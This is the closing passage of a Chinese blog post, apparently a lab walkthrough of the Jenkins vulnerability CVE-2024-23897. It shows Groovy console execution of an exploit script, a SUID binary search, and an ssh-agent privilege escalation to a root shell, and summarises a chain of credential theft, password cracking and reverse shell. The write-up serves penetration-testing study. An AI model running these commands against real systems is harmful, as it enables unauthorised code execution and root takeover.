<pre><code class="prism language-powershell">println <span class="token string">"/bin/bash /tmp/exploit.sh"</span><span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
</code></pre> 
<p><img src="https://images2.imgbox.com/6b/8d/pkBYqMuB_o.png" alt="在这里插入图片描述"><br> 但是无权限读取文件，那么就需要进行权限提升！<br> <img src="https://images2.imgbox.com/93/a5/iDv5KAGG_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="2_369"></a>（2）权限提升</h3> 
<pre><code class="prism language-powershell">find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>4000
</code></pre> 
<p><img src="https://images2.imgbox.com/7d/0b/flCbWcKU_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-powershell">find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>4000 2&gt;<span class="token operator">/</span>dev/null
</code></pre> 
<p><img src="https://images2.imgbox.com/e0/b1/3cohaVCw_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-powershell">ssh-agent <span class="token operator">/</span>bin/bash <span class="token operator">-</span>p
</code></pre> 
<p><img src="https://images2.imgbox.com/d2/bf/t3P94mt2_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_385"></a>七、结束语</h2> 
<p>在本文中，我们深入探讨了Jenkins的一个安全漏洞（CVE-2024–23897），通过实际的实验室操作，带你一步步了解渗透测试的关键技术和步骤。从文件描述符和输出管理到Jenkins凭证的挖掘，再到密码破解和反向Shell建立，最后到权限提升，每个环节都涉及了渗透测试中的重要方面。目前此文还有更多的技术面和难题是不容易摸清的，我还是需要有空的时候重温一下。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2947e493c6afe7bfda6976f5bd32736b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">小程序Taro框架 自定义底部Tabbar，处理自定义Tab栏切换卡顿、闪烁</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/106407a334939a63524a53b33a7d95b0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">AI从截图直接生成代码、前端程序员的福音</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>